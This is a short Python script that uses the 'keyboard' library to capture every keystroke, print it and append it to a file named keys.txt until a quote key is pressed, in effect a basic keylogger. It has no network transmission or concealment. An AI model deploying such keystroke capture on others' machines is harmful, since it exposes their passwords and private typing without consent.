import keyboard as k
from time import sleep

f = open("keys.txt", "a")
while 1 == 1:
    key = str(k.read_key())
    
    if key == "'":
        break
    print(key)
    key = key + "\n"
    f.writelines(key)
    sleep(0.1)

